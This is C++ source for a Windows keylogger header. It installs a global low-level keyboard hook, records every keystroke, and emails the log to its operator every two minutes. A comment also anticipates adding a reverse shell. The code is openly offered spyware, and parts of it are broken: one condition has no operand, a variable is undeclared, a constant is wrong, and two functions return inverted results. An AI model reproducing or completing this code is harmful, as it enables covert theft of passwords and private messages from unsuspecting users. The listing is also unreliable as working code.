#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

// Var in which the log is stored;
std::string keylog = "";

void TimerSendMail() {
    // attempt to send an email every (2) minutes

    //check if anything is recorded
    if(keylog.empty())
        return;

    /*
     * Attempt to create an encrypted log where to place current time
     * if succeeds return name of the file
     * otherwise return "" */
    std::string last_file = IO::WriteLog(keylog);
    if(last_file.empty()){
        Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");

        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Hi :)\nThe file has been attached to this mail :)\n"
                           "For testing, enjoy:\n" + keylog,
                           IO::GetOurPath(true) + last_file);
    if( != 7)
        Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
    else
        keylog = "";
}
// Set the timer to 2 minutes
Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);

// Pointer of type hook to our hook
HHOOK eHook = NULL;

// Call this function by the system when the keyboard key is pressed
// LOL: can disable some keys from the keyboard
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
    /* nCode; if nCode is <0  , that means we need to propagate the hook.
            not interested, because we cannot intercept keypresses*/
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam; //cast to pointer

    // Check if key is pressed (but not released) - HOLD
    // e.g. when SHIFT IS HOLD WITH ANOTHER KEY
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
        keylog += Keys::KEYS[kbs -> vkCode].Name; // from vk-mode to user-friendly names

        if(kbs -> vkCode == VK_RETURN)
            keylog += '\n';     // if ENTER -> goto newline
    }
    // Check if keys are RELEASED (aka. NOT PRESSED)
    //         [SHIFT][a][b][c][/SHIFT]]
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
        DWORD key = kbs->vkCode;

        if(key == VK_CONTROL
                || key == VK_LCONTROL
                || key == VK_RCONTROL
                || key == VK_SHIFT
                || key == VK_RSHIFT
                || key == VK_LSHIFT
                || key == MENU
                || key == VK_LMENU
                || key == VK_LMENU
                || key == VK_RMENU
                || key == VK_CAPITAL
                || key == VK_NUMLOCK
                || key == VK_LWIN
                || key == VK_RWIN) {
            // Body of the if-statement
            // Translation work here
            std::string KeyName = Keys::KEYS[bks->vkCode].Name;
            KeyName.insert(1, "/"); // insert the backslash for a HOLD-ing key (pressed)
            keylog += KeyName;
        }
    }

    // Propagate the keys to the system
    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

// Install hook function
bool InstallHook() {
    Helper::WriteAppLog("Hook Started... Timer started");
    MailTimer.Start(true);

    // WH_KEYBOARD_LL : global hook; the value of the constant is 13(LL =lowlevel)
    // OutKeyboardProc: procedure that will be invoked by the HookSystem every time the user presses the key;
    //                  we need to convert it to HOOKPROC because SetWindowsHookEx function accepts a handle to hook procedure
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                             GetModuleHandle(NULL), 0);

    return eHook == NULL;
}

// For future reference. for the reverse-shell. Not used now
bool UninstallHook() {
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;

    return (bool)b;
}

bool isHooked() {
    return (bool)(eHook == NULL);
}

#endif // KEYBHOOK_H
